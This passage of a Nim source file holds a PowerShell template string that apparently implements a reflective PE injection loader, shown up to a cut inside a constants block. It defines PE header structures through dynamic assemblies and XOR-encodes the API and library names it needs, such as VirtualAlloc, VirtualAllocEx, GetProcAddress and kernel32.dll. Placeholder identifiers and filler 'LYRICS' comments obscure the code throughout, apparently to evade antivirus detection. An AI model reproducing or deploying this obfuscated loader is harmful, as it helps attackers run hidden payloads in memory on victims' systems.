let Powershelltemplate* = """

function FUN000 {
# LYRICS001
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $VAR001,
# LYRICS002
        [Parameter(Position = 1)]
        [String[]]
        $VAR002,
# LYRICS003
        [Parameter(Position = 2)]
        [ValidateSet( 'WideStr', 'Str', 'NoOutput', 'DefaultSettings' )]
        [String]
        $VAR003 = 'DefaultSettings',
# LYRICS004
        [Parameter(Position = 3)]
        [String]
        $VAR004,
# LYRICS005
        [Parameter(Position = 4)]
        [Int32]
        $VAR005,
# LYRICS006
        [Parameter(Position = 5)]
        [String]
        $VAR006,
# LYRICS007
        [Switch]
        $VAR007,
# LYRICS008
        [Switch]
        $VAR008
    )
# LYRICS009
    Set-StrictMode -Version 2
# LYRICS010
# LYRICS011
    $VAR009 = {
        [CmdletBinding()]
        Param(
            [Parameter(Position = 0, Mandatory = $true)]
            [Byte[]]
            $VAR001,
# LYRICS012
            [Parameter(Position = 1, Mandatory = $true)]
            [String]
            $VAR003,
# LYRICS013
            [Parameter(Position = 2, Mandatory = $true)]
            [Int32]
            $VAR005,
# LYRICS014
            [Parameter(Position = 3, Mandatory = $true)]
            [String]
            $VAR006,
# LYRICS015
            [Parameter(Position = 4, Mandatory = $true)]
            [Bool]
            $VAR007,
# LYRICS016
            [Parameter(Position = 5, Mandatory = $true)]
            [String]
            $VAR004
        )
# LYRICS017
# LYRICS018
# LYRICS019
# LYRICS020
        Function FUN001 {
# LYRICS021
# LYRICS022
            $VAR010 = New-Object System.Object
# LYRICS023
# LYRICS024
# LYRICS025
            $Domain = [AppDomain]::CurrentDomain
# LYRICS026
# LYRICS027
            $VAR012 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
# LYRICS028
# LYRICS029
            $VAR013 = $Domain.DefineDynamicAssembly($VAR012, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $VAR014 = $VAR013.DefineDynamicModule('DynamicModule', $false)
# LYRICS030
# LYRICS031
            $VAR015 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
# LYRICS032
# LYRICS033
# LYRICS034
# LYRICS035
            $VAR011 = $VAR014.DefineEnum('MachineType', 'Public', [UInt16])
            $VAR011.DefineLiteral('Native', [UInt16] 0) | Out-Null
            $VAR011.DefineLiteral('CONST089', [UInt16] 0x014c) | Out-Null
            $VAR011.DefineLiteral('CONST090', [UInt16] 0x0200) | Out-Null
# LYRICS036
# LYRICS037
            $VAR011.DefineLiteral('CONST091', [UInt16] 0x8664) | Out-Null
            $VAR016 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name MachineType -Value $VAR016
# LYRICS038
# LYRICS039
            $VAR011 = $VAR014.DefineEnum('MagicType', 'Public', [UInt16])
            $VAR011.DefineLiteral('CONST100', [UInt16] 0x10b) | Out-Null
            $VAR011.DefineLiteral('CONST101', [UInt16] 0x20b) | Out-Null
            $VAR021 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name MagicType -Value $VAR021
# LYRICS040
# LYRICS041
            $VAR011 = $VAR014.DefineEnum('CONST047Type', 'Public', [UInt16])
            $VAR011.DefineLiteral('CONST102', [UInt16] 0) | Out-Null
            $VAR011.DefineLiteral('CONST103', [UInt16] 1) | Out-Null
            $VAR011.DefineLiteral('CONST104', [UInt16] 2) | Out-Null
            $VAR011.DefineLiteral('CONST099', [UInt16] 3) | Out-Null
            $VAR011.DefineLiteral('CONST098', [UInt16] 7) | Out-Null
# LYRICS042
# LYRICS043
            $VAR011.DefineLiteral('CONST097', [UInt16] 9) | Out-Null
            $VAR011.DefineLiteral('CONST096', [UInt16] 10) | Out-Null
            $VAR011.DefineLiteral('CONST095', [UInt16] 11) | Out-Null
            $VAR011.DefineLiteral('CONST094', [UInt16] 12) | Out-Null
# LYRICS044
# LYRICS045
            $VAR011.DefineLiteral('CONST093', [UInt16] 13) | Out-Null
            $VAR011.DefineLiteral('CONST092', [UInt16] 14) | Out-Null
            $VAR017 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST047Type -Value $VAR017
# LYRICS046
# LYRICS047
            $VAR011 = $VAR014.DefineEnum('CONST035Type', 'Public', [UInt16])
            $VAR011.DefineLiteral('CONST080', [UInt16] 0x0001) | Out-Null
            $VAR011.DefineLiteral('CONST079', [UInt16] 0x0002) | Out-Null
            $VAR011.DefineLiteral('CONST078', [UInt16] 0x0004) | Out-Null
            $VAR011.DefineLiteral('CONST077', [UInt16] 0x0008) | Out-Null
            $VAR011.DefineLiteral('CONST088', [UInt16] 0x0040) | Out-Null
            $VAR011.DefineLiteral('CONST087', [UInt16] 0x0080) | Out-Null
# LYRICS048
# LYRICS049
            $VAR011.DefineLiteral('CONST086', [UInt16] 0x0100) | Out-Null
            $VAR011.DefineLiteral('CONST085', [UInt16] 0x0200) | Out-Null
            $VAR011.DefineLiteral('CONST084', [UInt16] 0x0400) | Out-Null
            $VAR011.DefineLiteral('CONST083', [UInt16] 0x0800) | Out-Null
            $VAR011.DefineLiteral('CONST076', [UInt16] 0x1000) | Out-Null
            $VAR011.DefineLiteral('CONST082', [UInt16] 0x2000) | Out-Null
            $VAR011.DefineLiteral('CONST081', [UInt16] 0x8000) | Out-Null
            $VAR018 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST035Type -Value $VAR018
# LYRICS050
# LYRICS051
# LYRICS052
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST075', $VAR019, [System.ValueType], 8)
        ($VAR011.DefineField('CONST074', [UInt32], 'Public')).SetOffset(0) | Out-Null
# LYRICS053
# LYRICS054
        ($VAR011.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
            $VAR020 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST075 -Value $VAR020
# LYRICS055
# LYRICS056
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST073', $VAR019, [System.ValueType], 20)
            $VAR011.DefineField('Machine', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST072', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST071', [UInt32], 'Public') | Out-Null
# LYRICS057
# LYRICS058
            $VAR011.DefineField('CONST070', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST069', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST068', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST067', [UInt16], 'Public') | Out-Null
            $VAR022 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST073 -Value $VAR022
# LYRICS059
# LYRICS060
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST066', $VAR019, [System.ValueType], 240)
        ($VAR011.DefineField('Magic', $VAR021, 'Public')).SetOffset(0) | Out-Null
        ($VAR011.DefineField('CONST065', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($VAR011.DefineField('CONST064', [Byte], 'Public')).SetOffset(3) | Out-Null
# LYRICS061
# LYRICS062
        ($VAR011.DefineField('CONST063', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($VAR011.DefineField('CONST062', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($VAR011.DefineField('CONST061', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($VAR011.DefineField('CONST060', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($VAR011.DefineField('CONST059', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($VAR011.DefineField('CONST058', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($VAR011.DefineField('CONST057', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($VAR011.DefineField('CONST056', [UInt32], 'Public')).SetOffset(36) | Out-Null
# LYRICS063
# LYRICS064
        ($VAR011.DefineField('CONST055', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($VAR011.DefineField('CONST054', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($VAR011.DefineField('CONST053', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($VAR011.DefineField('CONST052', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($VAR011.DefineField('CONST051', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($VAR011.DefineField('CONST050', [UInt16], 'Public')).SetOffset(50) | Out-Null
# LYRICS065
# LYRICS066
        ($VAR011.DefineField('CONST049', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($VAR011.DefineField('CONST033', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($VAR011.DefineField('CONST034', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($VAR011.DefineField('CONST048', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($VAR011.DefineField('CONST047', $VAR017, 'Public')).SetOffset(68) | Out-Null
        ($VAR011.DefineField('CONST035', $VAR018, 'Public')).SetOffset(70) | Out-Null
        ($VAR011.DefineField('CONST046', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($VAR011.DefineField('CONST045', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($VAR011.DefineField('CONST044', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($VAR011.DefineField('CONST043', [UInt64], 'Public')).SetOffset(96) | Out-Null
# LYRICS067
# LYRICS068
        ($VAR011.DefineField('CONST105', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($VAR011.DefineField('CONST106', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($VAR011.DefineField('CONST107', $VAR020, 'Public')).SetOffset(112) | Out-Null
        ($VAR011.DefineField('CONST108', $VAR020, 'Public')).SetOffset(120) | Out-Null
        ($VAR011.DefineField('CONST109', $VAR020, 'Public')).SetOffset(128) | Out-Null
        ($VAR011.DefineField('CONST110', $VAR020, 'Public')).SetOffset(136) | Out-Null
        ($VAR011.DefineField('CONST111', $VAR020, 'Public')).SetOffset(144) | Out-Null
        ($VAR011.DefineField('CONST112', $VAR020, 'Public')).SetOffset(152) | Out-Null
        ($VAR011.DefineField('Debug', $VAR020, 'Public')).SetOffset(160) | Out-Null
# LYRICS069
# LYRICS070
        ($VAR011.DefineField('Architecture', $VAR020, 'Public')).SetOffset(168) | Out-Null
        ($VAR011.DefineField('CONST113', $VAR020, 'Public')).SetOffset(176) | Out-Null
        ($VAR011.DefineField('CONST114', $VAR020, 'Public')).SetOffset(184) | Out-Null
        ($VAR011.DefineField('CONST115', $VAR020, 'Public')).SetOffset(192) | Out-Null
        ($VAR011.DefineField('CONST120', $VAR020, 'Public')).SetOffset(200) | Out-Null
# LYRICS071
# LYRICS072
        ($VAR011.DefineField('IAT', $VAR020, 'Public')).SetOffset(208) | Out-Null
        ($VAR011.DefineField('CONST116', $VAR020, 'Public')).SetOffset(216) | Out-Null
        ($VAR011.DefineField('CONST117', $VAR020, 'Public')).SetOffset(224) | Out-Null
# LYRICS073
# LYRICS074
        ($VAR011.DefineField('Reserved', $VAR020, 'Public')).SetOffset(232) | Out-Null
            $VAR023 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST066 -Value $VAR023
# LYRICS075
# LYRICS076
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST118', $VAR019, [System.ValueType], 224)
        ($VAR011.DefineField('Magic', $VAR021, 'Public')).SetOffset(0) | Out-Null
        ($VAR011.DefineField('CONST065', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($VAR011.DefineField('CONST064', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($VAR011.DefineField('CONST063', [UInt32], 'Public')).SetOffset(4) | Out-Null
# LYRICS077
# LYRICS078
        ($VAR011.DefineField('CONST062', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($VAR011.DefineField('CONST061', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($VAR011.DefineField('CONST060', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($VAR011.DefineField('CONST059', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($VAR011.DefineField('CONST119', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($VAR011.DefineField('CONST058', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($VAR011.DefineField('CONST057', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($VAR011.DefineField('CONST056', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($VAR011.DefineField('CONST055', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($VAR011.DefineField('CONST054', [UInt16], 'Public')).SetOffset(42) | Out-Null
# LYRICS079
# LYRICS080
        ($VAR011.DefineField('CONST053', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($VAR011.DefineField('CONST052', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($VAR011.DefineField('CONST051', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($VAR011.DefineField('CONST050', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($VAR011.DefineField('CONST049', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($VAR011.DefineField('CONST033', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($VAR011.DefineField('CONST034', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($VAR011.DefineField('CONST048', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($VAR011.DefineField('CONST047', $VAR017, 'Public')).SetOffset(68) | Out-Null
        ($VAR011.DefineField('CONST035', $VAR018, 'Public')).SetOffset(70) | Out-Null
        ($VAR011.DefineField('CONST046', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($VAR011.DefineField('CONST045', [UInt32], 'Public')).SetOffset(76) | Out-Null
# LYRICS081
# LYRICS082
        ($VAR011.DefineField('CONST044', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($VAR011.DefineField('CONST043', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($VAR011.DefineField('CONST105', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($VAR011.DefineField('CONST106', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($VAR011.DefineField('CONST107', $VAR020, 'Public')).SetOffset(96) | Out-Null
        ($VAR011.DefineField('CONST108', $VAR020, 'Public')).SetOffset(104) | Out-Null
        ($VAR011.DefineField('CONST109', $VAR020, 'Public')).SetOffset(112) | Out-Null
        ($VAR011.DefineField('CONST110', $VAR020, 'Public')).SetOffset(120) | Out-Null
        ($VAR011.DefineField('CONST111', $VAR020, 'Public')).SetOffset(128) | Out-Null
        ($VAR011.DefineField('CONST112', $VAR020, 'Public')).SetOffset(136) | Out-Null
        ($VAR011.DefineField('Debug', $VAR020, 'Public')).SetOffset(144) | Out-Null
        ($VAR011.DefineField('Architecture', $VAR020, 'Public')).SetOffset(152) | Out-Null
        ($VAR011.DefineField('CONST113', $VAR020, 'Public')).SetOffset(160) | Out-Null
# LYRICS083
# LYRICS084
        ($VAR011.DefineField('CONST114', $VAR020, 'Public')).SetOffset(168) | Out-Null
        ($VAR011.DefineField('CONST115', $VAR020, 'Public')).SetOffset(176) | Out-Null
        ($VAR011.DefineField('CONST120', $VAR020, 'Public')).SetOffset(184) | Out-Null
        ($VAR011.DefineField('IAT', $VAR020, 'Public')).SetOffset(192) | Out-Null
# LYRICS085
# LYRICS086
        ($VAR011.DefineField('CONST116', $VAR020, 'Public')).SetOffset(200) | Out-Null
        ($VAR011.DefineField('CONST117', $VAR020, 'Public')).SetOffset(208) | Out-Null
        ($VAR011.DefineField('Reserved', $VAR020, 'Public')).SetOffset(216) | Out-Null
            $VAR024 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST118 -Value $VAR024
# LYRICS087
# LYRICS088
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST03164', $VAR019, [System.ValueType], 264)
            $VAR011.DefineField('Signature', [UInt32], 'Public') | Out-Null
# LYRICS089
# LYRICS090
            $VAR011.DefineField('CONST121', $VAR022, 'Public') | Out-Null
            $VAR011.DefineField('CONST122', $VAR023, 'Public') | Out-Null
# LYRICS091
# LYRICS092
            $VAR025 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST03164 -Value $VAR025
# LYRICS093
# LYRICS094
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
# LYRICS095
# LYRICS096
            $VAR011 = $VAR014.DefineType('CONST03132', $VAR019, [System.ValueType], 248)
            $VAR011.DefineField('Signature', [UInt32], 'Public') | Out-Null
# LYRICS097
# LYRICS098
            $VAR011.DefineField('CONST121', $VAR022, 'Public') | Out-Null
            $VAR011.DefineField('CONST122', $VAR024, 'Public') | Out-Null
            $VAR026 = $VAR011.CreateType()
# LYRICS099
# LYRICS100
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST03132 -Value $VAR026
# LYRICS101
# LYRICS102
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST123', $VAR019, [System.ValueType], 64)
            $VAR011.DefineField('CONST124', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST125', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST126', [UInt16], 'Public') | Out-Null
# LYRICS103
# LYRICS104
            $VAR011.DefineField('CONST127', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST128', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST129', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST130', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST131', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST132', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST133', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST134', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST135', [UInt16], 'Public') | Out-Null
# LYRICS105
# LYRICS106
            $VAR011.DefineField('CONST136', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST137', [UInt16], 'Public') | Out-Null
# LYRICS107
            $VAR027 = $VAR011.DefineField('CONST138', [UInt16[]], 'Public, HasFieldMarshal')
# LYRICS108
# LYRICS109
            $VAR028 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
            $VAR029 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
# LYRICS110
# LYRICS111
            $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 4))
            $VAR027.SetCustomAttribute($VAR030)
# LYRICS112
            $VAR011.DefineField('CONST139', [UInt16], 'Public') | Out-Null
# LYRICS113
# LYRICS114
            $VAR011.DefineField('CONST140', [UInt16], 'Public') | Out-Null
# LYRICS115
# LYRICS116
            $VAR031 = $VAR011.DefineField('CONST1382', [UInt16[]], 'Public, HasFieldMarshal')
            $VAR028 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
# LYRICS117
# LYRICS118
            $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 10))
# LYRICS119
# LYRICS120
            $VAR031.SetCustomAttribute($VAR030)
# LYRICS121
            $VAR011.DefineField('CONST141', [Int32], 'Public') | Out-Null
            $VAR032 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST123 -Value $VAR032
# LYRICS122
# LYRICS123
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST142', $VAR019, [System.ValueType], 40)
# LYRICS124
# LYRICS125
# LYRICS126
            $VAR033 = $VAR011.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
            $VAR028 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
# LYRICS127
# LYRICS128
            $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 8))
            $VAR033.SetCustomAttribute($VAR030)
# LYRICS129
            $VAR011.DefineField('CONST143', [UInt32], 'Public') | Out-Null
# LYRICS130
# LYRICS131
            $VAR011.DefineField('CONST074', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST144', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST145', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST146', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST147', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST148', [UInt16], 'Public') | Out-Null
# LYRICS132
# LYRICS133
            $VAR011.DefineField('CONST149', [UInt16], 'Public') | Out-Null
# LYRICS134
# LYRICS135
            $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
            $VAR034 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST142 -Value $VAR034
# LYRICS136
# LYRICS137
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST150', $VAR019, [System.ValueType], 8)
            $VAR011.DefineField('CONST074', [UInt32], 'Public') | Out-Null
# LYRICS138
# LYRICS139
            $VAR011.DefineField('CONST151', [UInt32], 'Public') | Out-Null
            $VAR035 = $VAR011.CreateType()
# LYRICS140
# LYRICS141
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST150 -Value $VAR035
# LYRICS142
# LYRICS143
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST152', $VAR019, [System.ValueType], 20)
            $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST071', [UInt32], 'Public') | Out-Null
# LYRICS144
# LYRICS145
            $VAR011.DefineField('CONST153', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('Name', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST154', [UInt32], 'Public') | Out-Null
            $VAR036 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST152 -Value $VAR036
# LYRICS146
# LYRICS147
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST155', $VAR019, [System.ValueType], 40)
            $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST071', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST156', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST157', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('Name', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('Base', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST158', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST159', [UInt32], 'Public') | Out-Null
# LYRICS148
# LYRICS149
            $VAR011.DefineField('CONST160', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST161', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST162', [UInt32], 'Public') | Out-Null
            $VAR037 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST155 -Value $VAR037
# LYRICS150
# LYRICS151
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST163', $VAR019, [System.ValueType], 8)
            $VAR011.DefineField('CONST164', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST165', [UInt32], 'Public') | Out-Null
            $VAR038 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST163 -Value $VAR038
# LYRICS152
# LYRICS153
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST166', $VAR019, [System.ValueType], 12)
            $VAR011.DefineField('CONST163', $VAR038, 'Public') | Out-Null
# LYRICS154
# LYRICS155
            $VAR011.DefineField('Attributes', [UInt32], 'Public') | Out-Null
            $VAR039 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST166 -Value $VAR039
# LYRICS156
# LYRICS157
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST167', $VAR019, [System.ValueType], 16)
# LYRICS158
# LYRICS159
            $VAR011.DefineField('CONST168', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST169', $VAR039, 'Public') | Out-Null
            $VAR040 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST167 -Value $VAR040
# LYRICS160
            return $VAR010
        }
# LYRICS161
        Function FUN100
        {
        Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [byte[]]
                $VAR0320
            )
# LYRICS162
            $VAR0322 = [Byte]0x5A
# LYRICS163
# LYRICS164
            $VAR0321 = for ($i = 0; $i -lt $VAR0320.Length; $i++) { [char]([Byte]$VAR0320[$i] -bxor $VAR0322) } -join ''
# LYRICS165
# LYRICS166
# LYRICS167
            return [String]($VAR0321 | ForEach-Object { $_ }) -join ""
# LYRICS168
        }
# LYRICS169
        $VAR0303 = [Byte]0x5A
        $VAR0300 = 49,63,40,52,63,54,105,104,116,62,54,54
# LYRICS170
# LYRICS171
        $VAR0301 = for ($i = 0; $i -lt $VAR0300.Length; $i++) { [char]([Byte]$VAR0300[$i] -bxor $VAR0303) } -join ''
        $VAR0302 = ($VAR0301 | ForEach-Object { $_ }) -join ""
# LYRICS172
        $VAR0304 = 27,62,44,59,42,51,105,104,116,62,54,54
        $VAR0305 = for ($i = 0; $i -lt $VAR0304.Length; $i++) { [char]([Byte]$VAR0304[$i] -bxor $VAR0303) } -join ''
# LYRICS173
# LYRICS174
        $VAR0306 = ($VAR0305 | ForEach-Object { $_ }) -join ""
# LYRICS175
        $VAR0307 = 55,41,44,57,40,46,116,62,54,54
        $VAR0308 = for ($i = 0; $i -lt $VAR0307.Length; $i++) { [char]([Byte]$VAR0307[$i] -bxor $VAR0303) } -join ''
# LYRICS176
# LYRICS177
        $VAR0309 = ($VAR0308 | ForEach-Object { $_ }) -join ""
# LYRICS178
        $VAR0310 = 29,63,46,10,40,53,57,27,62,62,40,63,41,41
# LYRICS179
# LYRICS180
        $VAR0311 = for ($i = 0; $i -lt $VAR0310.Length; $i++) { [char]([Byte]$VAR0310[$i] -bxor $VAR0303) } -join ''
# LYRICS181
# LYRICS182
        $VAR0312 = ($VAR0311 | ForEach-Object { $_ }) -join ""
# LYRICS183
        $VAR0313 = 12,51,40,46,47,59,54,27,54,54,53,57
        $VAR0314 = for ($i = 0; $i -lt $VAR0313.Length; $i++) { [char]([Byte]$VAR0313[$i] -bxor $VAR0303) } -join ''
# LYRICS184
# LYRICS185
        $VAR0315 = ($VAR0314 | ForEach-Object { $_ }) -join ''
# LYRICS186
        $VAR0316 = 12,51,40,46,47,59,54,27,54,54,53,57,31,34
        $VAR0317 = for ($i = 0; $i -lt $VAR0316.Length; $i++) { [char]([Byte]$VAR0316[$i] -bxor $VAR0303) } -join ''
# LYRICS187
# LYRICS188
        $VAR0318 = ($VAR0317 | ForEach-Object { $_ }) -join ''
# LYRICS189
                    $VAR0327 = 22,53,59,62,22,51,56,40,59,40,35,27
# LYRICS190
# LYRICS191
            $VAR0328 = for ($i = 0; $i -lt $VAR0327.Length; $i++) { [char]([Byte]$VAR0327[$i] -bxor $VAR0303) } -join ''
            $VAR0329 = ($VAR0328 | ForEach-Object { $_ }) -join ''
# LYRICS192
# LYRICS193
# LYRICS194
        Function FUN002 {
# LYRICS195
# LYRICS196
            $VAR0041 = New-Object System.Object
# LYRICS197
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST001 -Value 0x00001000
# LYRICS198
# LYRICS199
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST002 -Value 0x00002000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST003 -Value 0x01
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST004 -Value 0x02
# LYRICS200
# LYRICS201
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST005 -Value 0x04
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST006 -Value 0x08
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST007 -Value 0x10
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST009 -Value 0x20
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST008 -Value 0x40
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST010 -Value 0x80
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST011 -Value 0x200
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST012 -Value 0
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST013 -Value 3
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST014 -Value 10
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST015 -Value 0x02000000
# LYRICS202
# LYRICS203
